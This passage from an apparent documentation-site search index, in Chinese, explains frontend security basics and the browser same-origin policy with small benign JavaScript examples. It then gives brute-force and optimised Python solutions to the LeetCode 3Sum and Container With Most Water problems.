\u4fe1\u606f\u6cc4\u9732","text":"<p>\u901a\u8fc7\u524d\u7aef\u4ee3\u7801\u6cc4\u9732\u654f\u611f\u4fe1\u606f\uff0c\u5982API\u5bc6\u94a5\u3001\u5185\u90e8\u8def\u5f84\u7b49\u3002</p>"},{"location":"frontend-security/overview/#6-javascript","title":"6. \u4e0d\u5b89\u5168\u7684JavaScript\u5b9e\u8df5","text":"<p>\u5982\u4f7f\u7528eval()\u3001\u5185\u8054\u4e8b\u4ef6\u5904\u7406\u7b49\u4e0d\u5b89\u5168\u7684\u7f16\u7801\u65b9\u5f0f\u3002</p>"},{"location":"frontend-security/overview/#_5","title":"\u524d\u7aef\u5b89\u5168\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"frontend-security/overview/#csp","title":"\u5185\u5bb9\u5b89\u5168\u7b56\u7565 (CSP)","text":"<p>\u901a\u8fc7HTTP\u5934\u9650\u5236\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u7684\u8d44\u6e90\u6765\u6e90\uff0c\u9632\u6b62XSS\u653b\u51fb\u3002</p>"},{"location":"frontend-security/overview/#_6","title":"\u8f93\u5165\u9a8c\u8bc1\u4e0e\u8f93\u51fa\u7f16\u7801","text":"<ul> <li>\u5bf9\u6240\u6709\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u9a8c\u8bc1</li> <li>\u5bf9\u8f93\u51fa\u5230\u9875\u9762\u7684\u6570\u636e\u8fdb\u884c\u9002\u5f53\u7f16\u7801</li> </ul>"},{"location":"frontend-security/overview/#https","title":"\u4f7f\u7528HTTPS","text":"<p>\u786e\u4fdd\u6240\u6709\u901a\u4fe1\u52a0\u5bc6\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u653b\u51fb\u3002</p>"},{"location":"frontend-security/overview/#cookie","title":"\u5b89\u5168\u7684Cookie\u8bbe\u7f6e","text":"<p>\u4f7f\u7528HttpOnly\u3001Secure\u3001SameSite\u7b49\u5c5e\u6027\u589e\u5f3aCookie\u5b89\u5168\u6027\u3002</p>"},{"location":"frontend-security/overview/#csrf","title":"\u9632\u8303CSRF\u653b\u51fb","text":"<ul> <li>\u4f7f\u7528CSRF\u4ee4\u724c</li> <li>\u9a8c\u8bc1\u8bf7\u6c42\u6765\u6e90\uff08Referer/Origin\u5934\uff09</li> </ul>"},{"location":"frontend-security/overview/#cors","title":"\u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df\u8d44\u6e90\u5171\u4eab (CORS)","text":"<p>\u6b63\u786e\u914d\u7f6eCORS\u7b56\u7565\uff0c\u5141\u8bb8\u5408\u6cd5\u7684\u8de8\u57df\u8bf7\u6c42\uff0c\u62d2\u7edd\u975e\u6cd5\u8bf7\u6c42\u3002</p>"},{"location":"frontend-security/overview/#_7","title":"\u672c\u7ae0\u8282\u5185\u5bb9\u9884\u89c8","text":"<p>\u5728\u63a5\u4e0b\u6765\u7684\u6587\u6863\u4e2d\uff0c\u6211\u4eec\u5c06\u8be6\u7ec6\u4ecb\u7ecd\uff1a</p> <ul> <li>\u540c\u6e90\u7b56\u7565\uff1a\u6df1\u5165\u7406\u89e3\u6d4f\u89c8\u5668\u7684\u540c\u6e90\u5b89\u5168\u673a\u5236</li> <li>\u8de8\u57df\u95ee\u9898\u4e0e\u89e3\u51b3\u65b9\u6848\uff1a\u5982\u4f55\u5b89\u5168\u5730\u5904\u7406\u8de8\u57df\u8bf7\u6c42</li> <li>\u5176\u4ed6\u524d\u7aef\u5b89\u5168\u4e13\u9898...</li> </ul> <p>\u901a\u8fc7\u5b66\u4e60\u8fd9\u4e9b\u5185\u5bb9\uff0c\u60a8\u5c06\u80fd\u591f\u6784\u5efa\u66f4\u5b89\u5168\u3001\u66f4\u53ef\u9760\u7684Web\u5e94\u7528\u7a0b\u5e8f\uff0c\u6709\u6548\u9632\u8303\u5404\u79cd\u524d\u7aef\u5b89\u5168\u5a01\u80c1\u3002</p>"},{"location":"frontend-security/same-origin-policy/","title":"\u540c\u6e90\u7b56\u7565 (Same-Origin Policy)","text":""},{"location":"frontend-security/same-origin-policy/#_1","title":"\u4ec0\u4e48\u662f\u540c\u6e90\u7b56\u7565\uff1f","text":"<p>\u540c\u6e90\u7b56\u7565\u662f\u6d4f\u89c8\u5668\u7684\u4e00\u4e2a\u91cd\u8981\u5b89\u5168\u673a\u5236\uff0c\u5b83\u9650\u5236\u4e86\u4e00\u4e2a\u6e90\uff08origin\uff09\u7684\u6587\u6863\u6216\u8005\u5b83\u52a0\u8f7d\u7684\u811a\u672c\u5982\u4f55\u4e0e\u53e6\u4e00\u4e2a\u6e90\u7684\u8d44\u6e90\u8fdb\u884c\u4ea4\u4e92\u3002\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u6076\u610f\u7f51\u7ad9\u7a83\u53d6\u7528\u6237\u6570\u636e\u6216\u8fdb\u884c\u672a\u6388\u6743\u7684\u64cd\u4f5c\u3002</p>"},{"location":"frontend-security/same-origin-policy/#_2","title":"\u540c\u6e90\u7684\u5b9a\u4e49","text":"<p>\u4e24\u4e2aURL\u88ab\u8ba4\u4e3a\u662f\u540c\u6e90\uff0c\u5f53\u4e14\u4ec5\u5f53\u5b83\u4eec\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u4e2a\u6761\u4ef6\u5b8c\u5168\u76f8\u540c\uff1a</p> <ol> <li>\u534f\u8bae(protocol) \u76f8\u540c</li> <li>\u57df\u540d(domain) \u76f8\u540c</li> <li>\u7aef\u53e3(port) \u76f8\u540c\uff08\u5982\u679c\u6307\u5b9a\u4e86\u7aef\u53e3\uff09</li> </ol>"},{"location":"frontend-security/same-origin-policy/#_3","title":"\u540c\u6e90\u68c0\u6d4b\u793a\u4f8b","text":"<p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u540c\u6e90\u68c0\u6d4b\u7684\u793a\u4f8b\uff1a</p> \u539f\u59cbURL \u6bd4\u8f83URL \u662f\u5426\u540c\u6e90 \u539f\u56e0 http://example.com/page1 http://example.com/page2 \u662f \u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u90fd\u76f8\u540c http://example.com:8080 http://example.com:8080/data \u662f \u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u90fd\u76f8\u540c http://example.com https://example.com \u5426 \u534f\u8bae\u4e0d\u540c\uff08http vs https\uff09 http://example.com http://www.example.com \u5426 \u57df\u540d\u4e0d\u540c http://example.com http://api.example.com \u5426 \u57df\u540d\u4e0d\u540c\uff08\u5b50\u57df\u540d\u4e0d\u540c\uff09 http://example.com:80 http://example.com:8080 \u5426 \u7aef\u53e3\u4e0d\u540c"},{"location":"frontend-security/same-origin-policy/#_4","title":"\u540c\u6e90\u7b56\u7565\u7684\u9650\u5236\u8303\u56f4","text":"<p>\u540c\u6e90\u7b56\u7565\u4e3b\u8981\u9650\u5236\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p>"},{"location":"frontend-security/same-origin-policy/#1-dom","title":"1. DOM \u8bbf\u95ee","text":"<p>\u4e00\u4e2a\u6e90\u7684JavaScript\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u53e6\u4e00\u4e2a\u6e90\u9875\u9762\u7684DOM\u3002</p> <pre><code>// \u4ee5\u4e0b\u4ee3\u7801\u5982\u679c\u5728\u4e0d\u540c\u6e90\u7684\u9875\u9762\u4e2d\u6267\u884c\uff0c\u4f1a\u629b\u51fa\u5b89\u5168\u9519\u8bef\nconst iframe = document.getElementById('myIframe');\nconst otherDoc = iframe.contentDocument; // \u8de8\u6e90\u65f6\u4f1a\u62a5\u9519\n</code></pre>"},{"location":"frontend-security/same-origin-policy/#2-xmlhttprequest-fetch-api","title":"2. XMLHttpRequest \u548c Fetch API","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9bAPI\u53ea\u80fd\u53d1\u8d77\u540c\u6e90\u8bf7\u6c42\uff0c\u4e0d\u80fd\u5411\u5176\u4ed6\u6e90\u53d1\u9001\u8bf7\u6c42\u3002</p> <pre><code>// \u8de8\u6e90\u8bf7\u6c42\u9ed8\u8ba4\u4f1a\u88ab\u963b\u6b62\nfetch('https://different-origin.com/data')\n  .then(response =&gt; response.json())\n  .catch(error =&gt; console.error('\u8de8\u57df\u8bf7\u6c42\u9519\u8bef:', error));\n</code></pre>"},{"location":"frontend-security/same-origin-policy/#3-cookielocalstorage-indexeddb","title":"3. Cookie\u3001LocalStorage \u548c IndexedDB","text":"<p>\u8fd9\u4e9b\u5b58\u50a8\u673a\u5236\u53d7\u5230\u540c\u6e90\u7b56\u7565\u7684\u4fdd\u62a4\uff0c\u4e00\u4e2a\u6e90\u4e0d\u80fd\u8bbf\u95ee\u53e6\u4e00\u4e2a\u6e90\u7684\u6570\u636e\u3002</p> <pre><code>// \u53ea\u80fd\u8bbf\u95ee\u5f53\u524d\u6e90\u7684localStorage\u6570\u636e\nlocalStorage.setItem('user', 'data'); // \u53ea\u80fd\u5728\u540c\u4e00\u6e90\u8bfb\u53d6\n</code></pre>"},{"location":"frontend-security/same-origin-policy/#4","title":"4. \u5176\u4ed6\u8d44\u6e90\u8bbf\u95ee\u9650\u5236","text":"<p>\u5982CSS\u3001JavaScript\u6587\u4ef6\u867d\u7136\u53ef\u4ee5\u8de8\u6e90\u52a0\u8f7d\uff0c\u4f46\u53d7\u9650\u4e8e\u540c\u6e90\u7b56\u7565\u7684\u5176\u4ed6\u89c4\u5219\u3002</p>"},{"location":"frontend-security/same-origin-policy/#_5","title":"\u540c\u6e90\u7b56\u7565\u7684\u4f8b\u5916","text":""},{"location":"frontend-security/same-origin-policy/#1","title":"1. \u5141\u8bb8\u8de8\u6e90\u5d4c\u5165\u7684\u8d44\u6e90","text":"<p>\u4ee5\u4e0b\u8d44\u6e90\u9ed8\u8ba4\u5141\u8bb8\u8de8\u6e90\u5d4c\u5165\uff1a</p> <ul> <li><code>&lt;script&gt;</code> \u6807\u7b7e\u52a0\u8f7d\u7684JavaScript</li> <li><code>&lt;link&gt;</code> \u6807\u7b7e\u52a0\u8f7d\u7684CSS</li> <li><code>&lt;img&gt;</code> \u6807\u7b7e\u52a0\u8f7d\u7684\u56fe\u7247</li> <li><code>&lt;video&gt;</code> \u548c <code>&lt;audio&gt;</code> \u6807\u7b7e\u52a0\u8f7d\u7684\u5a92\u4f53\u6587\u4ef6</li> <li><code>&lt;iframe&gt;</code> \u5d4c\u5165\u7684\u4efb\u4f55\u8d44\u6e90</li> <li><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;applet&gt;</code> \u5d4c\u5165\u7684\u63d2\u4ef6</li> </ul>"},{"location":"frontend-security/same-origin-policy/#2-cors","title":"2. \u8de8\u6e90\u8d44\u6e90\u5171\u4eab (CORS)","text":"<p>\u901a\u8fc7\u670d\u52a1\u5668\u914d\u7f6e\u7279\u5b9a\u7684HTTP\u5934\uff0c\u5141\u8bb8\u53d7\u63a7\u7684\u8de8\u6e90\u8bf7\u6c42\u3002</p>"},{"location":"frontend-security/same-origin-policy/#3-jsonp-json-with-padding","title":"3. JSONP (JSON with Padding)","text":"<p>\u5229\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\u4e0d\u53d7\u540c\u6e90\u7b56\u7565\u9650\u5236\u7684\u7279\u6027\uff0c\u5b9e\u73b0\u8de8\u6e90\u6570\u636e\u83b7\u53d6\u3002</p>"},{"location":"frontend-security/same-origin-policy/#_6","title":"\u540c\u6e90\u7b56\u7565\u7684\u91cd\u8981\u6027","text":"<p>\u540c\u6e90\u7b56\u7565\u662fWeb\u5b89\u5168\u7684\u57fa\u77f3\uff0c\u5b83\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u4fdd\u62a4\uff1a</p> <ol> <li>\u9632\u6b62\u6570\u636e\u7a83\u53d6\uff1a\u9632\u6b62\u6076\u610f\u7f51\u7ad9\u8bfb\u53d6\u53e6\u4e00\u4e2a\u7f51\u7ad9\u7684\u654f\u611f\u6570\u636e</li> <li>\u4fdd\u62a4\u7528\u6237\u51ed\u8bc1\uff1a\u9632\u6b62\u8de8\u7ad9\u4f1a\u8bdd\u52ab\u6301</li> <li>\u7ef4\u62a4\u7f51\u7ad9\u72ec\u7acb\u6027\uff1a\u786e\u4fdd\u6bcf\u4e2a\u7f51\u7ad9\u5728\u81ea\u5df1\u7684\u5b89\u5168\u6c99\u7bb1\u4e2d\u8fd0\u884c</li> <li>\u9632\u6b62\u6076\u610f\u64cd\u4f5c\uff1a\u9650\u5236\u672a\u6388\u6743\u7684\u8de8\u7ad9\u64cd\u4f5c</li> </ol>"},{"location":"frontend-security/same-origin-policy/#_7","title":"\u540c\u6e90\u7b56\u7565\u7684\u7ed5\u8fc7\u98ce\u9669","text":"<p>\u5c3d\u7ba1\u540c\u6e90\u7b56\u7565\u63d0\u4f9b\u4e86\u826f\u597d\u7684\u4fdd\u62a4\uff0c\u4f46\u4ecd\u5b58\u5728\u4e00\u4e9b\u7ed5\u8fc7\u98ce\u9669\uff1a</p> <ul> <li>XSS\u653b\u51fb\uff1a\u5982\u679c\u7f51\u7ad9\u5b58\u5728XSS\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u5165\u811a\u672c\u5728\u540c\u4e00\u6e90\u5185\u6267\u884c\uff0c\u4ece\u800c\u7ed5\u8fc7\u540c\u6e90\u7b56\u7565</li> <li>CSRF\u653b\u51fb\uff1a\u5229\u7528\u7528\u6237\u5df2\u6709\u7684\u8ba4\u8bc1\u72b6\u6001\u53d1\u8d77\u8de8\u7ad9\u8bf7\u6c42</li> <li>iframe\u5d4c\u5957\u653b\u51fb\uff1a\u901a\u8fc7\u67d0\u4e9b\u6280\u5de7\u7ed5\u8fc7iframe\u7684\u540c\u6e90\u9650\u5236</li> </ul>"},{"location":"frontend-security/same-origin-policy/#_8","title":"\u5982\u4f55\u5b89\u5168\u5904\u7406\u8de8\u6e90\u4ea4\u4e92","text":"<ol> <li>\u4f7f\u7528CORS\u8fdb\u884c\u5408\u6cd5\u8de8\u57df\u8bf7\u6c42</li> <li>\u5b9e\u65bd\u9002\u5f53\u7684\u5185\u5bb9\u5b89\u5168\u7b56\u7565(CSP)</li> <li>\u6b63\u786e\u914d\u7f6eCookie\u5c5e\u6027(SameSite, HttpOnly, Secure)</li> <li>\u5bf9\u6240\u6709\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u9a8c\u8bc1\u548c\u8f6c\u4e49</li> <li>\u4f7f\u7528postMessage API\u8fdb\u884c\u5b89\u5168\u7684\u8de8\u6e90\u901a\u4fe1</li> </ol>"},{"location":"frontend-security/same-origin-policy/#_9","title":"\u603b\u7ed3","text":"<p>\u540c\u6e90\u7b56\u7565\u662f\u6d4f\u89c8\u5668\u5b89\u5168\u7684\u57fa\u7840\u673a\u5236\uff0c\u5b83\u901a\u8fc7\u9650\u5236\u4e0d\u540c\u6e90\u4e4b\u95f4\u7684\u8d44\u6e90\u8bbf\u95ee\uff0c\u6709\u6548\u9632\u8303\u4e86\u5404\u79cd\u6076\u610f\u653b\u51fb\u3002\u4e86\u89e3\u540c\u6e90\u7b56\u7565\u7684\u5de5\u4f5c\u539f\u7406\u548c\u9650\u5236\uff0c\u5bf9\u4e8e\u6784\u5efa\u5b89\u5168\u7684Web\u5e94\u7528\u81f3\u5173\u91cd\u8981\u3002\u5728\u9700\u8981\u8fdb\u884c\u8de8\u6e90\u4ea4\u4e92\u65f6\uff0c\u5e94\u5f53\u91c7\u7528\u5b89\u5168\u7684\u673a\u5236\u5982CORS\u6216postMessage\uff0c\u5e76\u786e\u4fdd\u6b63\u786e\u5b9e\u65bd\u5404\u79cd\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\u3002</p>"},{"location":"leetcode-top100/overview/","title":"\u529b\u6263Top100 Python\u7b97\u6cd5\u9898","text":"<p>\u672c\u90e8\u5206\u5305\u542b\u529b\u6263\uff08LeetCode\uff09\u5e73\u53f0\u4e0a\u6700\u70ed\u95e8\u7684100\u9053\u7b97\u6cd5\u9898\u7684Python\u89e3\u51b3\u65b9\u6848\u3002\u6bcf\u9053\u9898\u76ee\u90fd\u63d0\u4f9b\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ol> <li>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u901a\u5e38\u662f\u66b4\u529b\u89e3\u6cd5\uff09\uff1a\u601d\u8def\u6e05\u6670\uff0c\u4f46\u53ef\u80fd\u65f6\u95f4\u6216\u7a7a\u95f4\u590d\u6742\u5ea6\u8f83\u9ad8</li> <li>\u6700\u4f18\u65b9\u6848\uff1a\u7ecf\u8fc7\u4f18\u5316\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u901a\u5e38\u5177\u6709\u66f4\u597d\u7684\u65f6\u95f4\u6216\u7a7a\u95f4\u590d\u6742\u5ea6</li> </ol> <p>\u6240\u6709\u9898\u89e3\u90fd\u4f7f\u7528\u7b80\u6d01\u660e\u4e86\u7684\u6587\u5b57\u8868\u8fbe\uff0c\u914d\u5408Python\u4ee3\u7801\u793a\u4f8b\uff0c\u5e2e\u52a9\u7406\u89e3\u7b97\u6cd5\u601d\u8def\u3002</p>"},{"location":"leetcode-top100/overview/#_1","title":"\u76ee\u5f55\u7ed3\u6784","text":"<ul> <li>\u6570\u7ec4\u548c\u5b57\u7b26\u4e32</li> <li>\u94fe\u8868\u548c\u6811</li> <li>\u52a8\u6001\u89c4\u5212</li> <li>\u5176\u4ed6\u7c7b\u578b</li> </ul>"},{"location":"leetcode-top100/overview/#_2","title":"\u4f7f\u7528\u8bf4\u660e","text":"<p>\u6bcf\u9053\u9898\u76ee\u7684\u6587\u6863\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u9898\u76ee\u63cf\u8ff0\uff1a\u7b80\u8981\u4ecb\u7ecd\u9898\u76ee\u8981\u6c42</li> <li>\u89e3\u9898\u601d\u8def\uff1a\u5206\u6790\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6cd5</li> <li>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff1a\u63d0\u4f9b\u66b4\u529b\u89e3\u6cd5\u4ee3\u7801</li> <li>\u6700\u4f18\u65b9\u6848\uff1a\u63d0\u4f9b\u4f18\u5316\u540e\u7684\u89e3\u51b3\u65b9\u6848\u4ee3\u7801</li> <li>\u590d\u6742\u5ea6\u5206\u6790\uff1a\u5206\u6790\u4e24\u79cd\u89e3\u6cd5\u7684\u65f6\u95f4\u548c\u7a7a\u95f4\u590d\u6742\u5ea6</li> </ul>"},{"location":"leetcode-top100/overview/#_3","title":"\u5b66\u4e60\u5efa\u8bae","text":"<ol> <li>\u5148\u5c1d\u8bd5\u81ea\u5df1\u89e3\u51b3\u95ee\u9898</li> <li>\u5bf9\u7167\u4e24\u79cd\u89e3\u6cd5\uff0c\u7406\u89e3\u7b97\u6cd5\u4f18\u5316\u7684\u601d\u8def</li> <li>\u5173\u6ce8\u65f6\u95f4\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u53d8\u5316</li> <li>\u5c1d\u8bd5\u4fee\u6539\u548c\u6269\u5c55\u4ee3\u7801\uff0c\u52a0\u6df1\u7406\u89e3</li> </ol>"},{"location":"leetcode-top100/arrays-strings/3sum/","title":"\u4e09\u6570\u4e4b\u548c","text":""},{"location":"leetcode-top100/arrays-strings/3sum/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u4f60\u4e00\u4e2a\u5305\u542b n \u4e2a\u6574\u6570\u7684\u6570\u7ec4 nums\uff0c\u5224\u65ad nums \u4e2d\u662f\u5426\u5b58\u5728\u4e09\u4e2a\u5143\u7d20 a\uff0cb\uff0cc \uff0c\u4f7f\u5f97 a + b + c = 0 \uff1f\u8bf7\u4f60\u627e\u51fa\u6240\u6709\u6ee1\u8db3\u6761\u4ef6\u4e14\u4e0d\u91cd\u590d\u7684\u4e09\u5143\u7ec4\u3002</p> <p>\u6ce8\u610f\uff1a\u7b54\u6848\u4e2d\u4e0d\u53ef\u4ee5\u5305\u542b\u91cd\u590d\u7684\u4e09\u5143\u7ec4\u3002</p>"},{"location":"leetcode-top100/arrays-strings/3sum/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u4e09\u91cd\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e09\u5143\u7ec4 2. \u6392\u5e8f+\u53cc\u6307\u9488\uff1a\u5148\u6392\u5e8f\uff0c\u7136\u540e\u4f7f\u7528\u53cc\u6307\u9488\u67e5\u627e</p>"},{"location":"leetcode-top100/arrays-strings/3sum/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u4f7f\u7528\u4e09\u91cd\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e09\u5143\u7ec4\uff0c\u68c0\u67e5\u5b83\u4eec\u7684\u548c\u662f\u5426\u4e3a 0\uff0c\u5e76\u53bb\u91cd\u3002</p> <pre><code>def three_sum_brute(nums):\n    if len(nums) &lt; 3:\n        return []\n\n    result = set()\n    # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e09\u5143\u7ec4\n    for i in range(len(nums)):\n        for j in range(i + 1, len(nums)):\n            for k in range(j + 1, len(nums)):\n                # \u68c0\u67e5\u4e09\u6570\u4e4b\u548c\u662f\u5426\u4e3a0\n                if nums[i] + nums[j] + nums[k] == 0:\n                    # \u5c06\u4e09\u5143\u7ec4\u6392\u5e8f\u540e\u5b58\u5165\u96c6\u5408\uff0c\u7528\u4e8e\u53bb\u91cd\n                    triplet = tuple(sorted([nums[i], nums[j], nums[k]]))\n                    result.add(triplet)\n\n    # \u5c06\u96c6\u5408\u8f6c\u6362\u4e3a\u5217\u8868\n    return [list(triplet) for triplet in result]\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/3sum/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u6392\u5e8f+\u53cc\u6307\u9488\u6cd5\uff09","text":"<p>\u5148\u5bf9\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f\uff0c\u7136\u540e\u56fa\u5b9a\u4e00\u4e2a\u5143\u7d20\uff0c\u4f7f\u7528\u53cc\u6307\u9488\u67e5\u627e\u53e6\u5916\u4e24\u4e2a\u5143\u7d20\uff0c\u4f7f\u5f97\u5b83\u4eec\u7684\u548c\u4e3a\u76ee\u6807\u503c\u7684\u76f8\u53cd\u6570\u3002</p> <pre><code>def three_sum_optimal(nums):\n    if len(nums) &lt; 3:\n        return []\n\n    # \u6392\u5e8f\u6570\u7ec4\n    nums.sort()\n    result = []\n\n    # \u904d\u5386\u6bcf\u4e2a\u5143\u7d20\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u5143\u7d20\n    for i in range(len(nums)):\n        # \u5982\u679c\u5f53\u524d\u5143\u7d20\u5927\u4e8e0\uff0c\u7531\u4e8e\u6570\u7ec4\u5df2\u6392\u5e8f\uff0c\u540e\u9762\u7684\u5143\u7d20\u90fd\u5927\u4e8e0\uff0c\u4e0d\u53ef\u80fd\u548c\u4e3a0\n        if nums[i] &gt; 0:\n            break\n\n        # \u8df3\u8fc7\u91cd\u590d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\n        if i &gt; 0 and nums[i] == nums[i - 1]:\n            continue\n\n        # \u8bbe\u7f6e\u5de6\u53f3\u6307\u9488\n        left = i + 1\n        right = len(nums) - 1\n\n        # \u4f7f\u7528\u53cc\u6307\u9488\u67e5\u627e\u53e6\u5916\u4e24\u4e2a\u5143\u7d20\n        while left &lt; right:\n            total = nums[i] + nums[left] + nums[right]\n\n            if total == 0:\n                # \u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u4e09\u5143\u7ec4\n                result.append([nums[i], nums[left], nums[right]])\n\n                # \u8df3\u8fc7\u91cd\u590d\u7684\u5de6\u6307\u9488\u5143\u7d20\n                while left &lt; right and nums[left] == nums[left + 1]:\n                    left += 1\n                # \u8df3\u8fc7\u91cd\u590d\u7684\u53f3\u6307\u9488\u5143\u7d20\n                while left &lt; right and nums[right] == nums[right - 1]:\n                    right -= 1\n\n                # \u79fb\u52a8\u6307\u9488\n                left += 1\n                right -= 1\n            elif total &lt; 0:\n                # \u603b\u548c\u592a\u5c0f\uff0c\u79fb\u52a8\u5de6\u6307\u9488\n                left += 1\n            else:\n                # \u603b\u548c\u592a\u5927\uff0c\u79fb\u52a8\u53f3\u6307\u9488\n                right -= 1\n\n    return result\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/3sum/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b3)\uff0c\u5176\u4e2d n \u662f\u6570\u7ec4\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u7528\u4e8e\u5b58\u50a8\u7ed3\u679c</p> </li> <li> <p>\u6392\u5e8f+\u53cc\u6307\u9488\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b2)\uff0c\u6392\u5e8f\u9700\u8981 O(nlogn)\uff0c\u53cc\u6307\u9488\u67e5\u627e\u9700\u8981 O(n\u00b2)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)\uff0c\u9664\u4e86\u5b58\u50a8\u7ed3\u679c\u5916\u4e0d\u9700\u8981\u989d\u5916\u7a7a\u95f4</li> </ul> <p>\u6392\u5e8f+\u53cc\u6307\u9488\u89e3\u6cd5\u901a\u8fc7\u6392\u5e8f\u548c\u53cc\u6307\u9488\u6280\u672f\uff0c\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u4ece O(n\u00b3) \u964d\u4f4e\u5230\u4e86 O(n\u00b2)\uff0c\u540c\u65f6\u907f\u514d\u4e86\u4f7f\u7528\u96c6\u5408\u53bb\u91cd\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u6548\u7387\u3002</p>"},{"location":"leetcode-top100/arrays-strings/container-with-most-water/","title":"\u76db\u6700\u591a\u6c34\u7684\u5bb9\u5668","text":""},{"location":"leetcode-top100/arrays-strings/container-with-most-water/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u4f60 n \u4e2a\u975e\u8d1f\u6574\u6570 a1\uff0ca2\uff0c...\uff0can\uff0c\u6bcf\u4e2a\u6570\u4ee3\u8868\u5750\u6807\u4e2d\u7684\u4e00\u4e2a\u70b9 (i, ai)\u3002\u5728\u5750\u6807\u5185\u753b n \u6761\u5782\u76f4\u7ebf\uff0c\u5782\u76f4\u7ebf i \u7684\u4e24\u4e2a\u7aef\u70b9\u5206\u522b\u4e3a (i, ai) \u548c (i, 0)\u3002\u627e\u51fa\u5176\u4e2d\u7684\u4e24\u6761\u7ebf\uff0c\u4f7f\u5f97\u5b83\u4eec\u4e0e x \u8f74\u5171\u540c\u6784\u6210\u7684\u5bb9\u5668\u53ef\u4ee5\u5bb9\u7eb3\u6700\u591a\u7684\u6c34\u3002</p>"},{"location":"leetcode-top100/arrays-strings/container-with-most-water/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u8ba1\u7b97\u6240\u6709\u53ef\u80fd\u7684\u5bb9\u5668\u5bb9\u91cf 2. \u53cc\u6307\u9488\uff1a\u4ece\u4e24\u7aef\u5411\u4e2d\u95f4\u79fb\u52a8\uff0c\u4f18\u5148\u79fb\u52a8\u8f83\u77ed\u7684\u8fb9\u754c</p>"},{"location":"leetcode-top100/arrays-strings/container-with-most-water/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e24\u6761\u7ebf\u7ec4\u5408\uff0c\u8ba1\u7b97\u6bcf\u4e2a\u5bb9\u5668\u7684\u5bb9\u91cf\uff0c\u8bb0\u5f55\u6700\u5927\u503c\u3002</p> <pre><code>def max_area_brute(height):\n    max_water = 0\n    # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e24\u6761\u7ebf\u7ec4\u5408\n    for i in range(len(height)):\n        for j in range(i + 1, len(height)):\n            # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u5bbd\u5ea6\n            width = j - i\n            # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u9ad8\u5ea6\uff08\u53d6\u4e24\u6761\u7ebf\u4e2d\u8f83\u4f4e\u7684\u90a3\u4e2a\uff09\n            h = min(height[i], height[j])\n            # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u5bb9\u91cf\n            current_water = width * h\n            # \u66f4\u65b0\u6700\u5927\u5bb9\u91cf\n            max_water = max(max_water, current_water)\n    return 